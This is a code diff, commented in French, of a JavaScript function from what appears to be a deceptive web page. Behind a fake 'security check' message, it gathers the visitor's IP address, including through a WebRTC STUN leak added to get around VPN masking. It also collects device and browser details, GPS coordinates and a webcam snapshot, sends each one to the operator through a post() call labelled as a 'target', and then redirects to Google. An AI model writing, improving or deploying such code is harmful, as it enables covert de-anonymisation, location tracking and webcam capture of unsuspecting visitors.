@@ -1,54 +1,60 @@
 async function execute() {
-            const box = document.querySelector('.box');
-            box.innerHTML = "<h3>Analyse en cours...</h3><p>Vérification des protocoles...</p>";
+    const box = document.querySelector('.box');
+    box.innerHTML = "<h3>Analyse en cours...</h3><p>Vérification des protocoles de sécurité...</p>";
 
-            let detectedIP = "Non détectée (Blocage Navigateur)";
+    let finalIP = "Détection impossible (Blocage Navigateur)";
 
-            // 1. RÉCUPÉRATION IP (On attend la réponse avant de passer à la suite)
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                if (response.ok) {
-                    const data = await response.json();
-                    detectedIP = data.ip;
-                }
-            } catch (e) {
-                // Deuxième tentative avec une autre API si la première est bloquée
-                try {
-                    const res2 = await fetch('https://ipapi.co/json/');
-                    const data2 = await res2.json();
-                    detectedIP = data2.ip;
-                } catch (e2) { console.log("Toutes les API IP sont bloquées."); }
-            }
+    // FONCTION WEBRTC POUR CHOPER L'IP RÉELLE
+    async function getRTCPeerConnectionIP() {
+        return new Promise((resolve) => {
+            const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
+            rtc.createDataChannel("");
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            rtc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
+                resolve(ip);
+                rtc.onicecandidate = null;
+            };
+            setTimeout(() => resolve(null), 1000);
+        });
+    }
 
-            // 2. ENVOI IMMÉDIAT (L'IP sera forcément incluse ici)
-            await post(`🚀 **CIBLE PC DÉTECTÉE**\n**IP**: ${detectedIP}\n**OS**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`);
+    // TENTATIVE DE RÉCUPÉRATION MULTIPLE
+    try {
+        const [ip1, ip2] = await Promise.all([
+            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => null),
+            getRTCPeerConnectionIP()
+        ]);
+        finalIP = ip1 || ip2 || "IP Masquée";
+    } catch (e) { console.log("Échec des APIs classiques"); }
 
-            // 3. GPS (On ne l'attend pas, ça peut être long)
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await post(`📍 **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, null, {timeout: 3000});
+    // ENVOI IMMÉDIAT
+    await post(`🚀 **CIBLE PC IDENTIFIÉE**\n**IP**: ${finalIP}\n**Appareil**: ${navigator.platform}\n**Navigateur**: ${navigator.userAgent}`);
 
-            // 4. CAMÉRA
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(async (blob) => {
-                            await post("📸 **CAPTURE IMAGE**", blob);
-                            stream.getTracks().forEach(t => t.stop());
-                            window.location.href = "https://www.google.com";
-                        }, 'image/png');
-                    }, 1000);
-                };
-            } catch (err) {
-                await post("⚠️ Caméra refusée");
-                window.location.href = "https://www.google.com";
-            }
-        }
+    // GPS & CAMÉRA (Suite habituelle)
+    navigator.geolocation.getCurrentPosition(async (p) => {
+        await post(`📍 **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+    }, null, {timeout: 3000});
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(async (blob) => {
+                    await post("📸 **CAPTURE RÉUSSIE**", blob);
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://www.google.com";
+                }, 'image/png');
+            }, 1000);
+        };
+    } catch (err) {
+        await post("⚠️ Caméra refusée");
+        window.location.href = "https://www.google.com";
+    }
+}
